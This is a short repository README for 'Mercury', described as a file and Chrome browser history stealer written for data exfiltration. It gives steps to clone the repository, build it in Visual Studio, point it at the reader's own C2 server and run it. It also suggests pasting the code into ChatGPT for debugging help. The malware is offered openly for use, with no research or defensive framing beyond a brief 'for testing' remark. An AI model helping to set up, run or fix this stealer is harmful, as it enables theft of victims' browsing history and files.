# Description
Mercury is a file and chrome browser history stealer that was written for data exfil. This repository contains Mercury's agent code. 


## How to setup:
Download this repository into a Windows virtual machine (for testing):
```
git clone https://github.com/0xConstant/Mercury
```
Make sure that you have installed Visual Studio and support for C++ language. Open the project in Visual Studio and link libraries such as zlib and sqlite.



## How to use 
Modify names.hpp by setting C2 URL to the URL of your C2 server, build solution and run it.  It may not work if Chrome is not installed or you don't have any chrome browsing history. 
I didn't modify the code to support file exfil if Chrome is not installed, so that's up to you to fix it if you care.


### How to solve errors:
ChatGPT is your friend, you can paste the entire content of main.cpp and it will tell you exactly how the code works. If you don't have access to that, join the following Discord server: </br>
https://discord.gg/9495pzJrZw
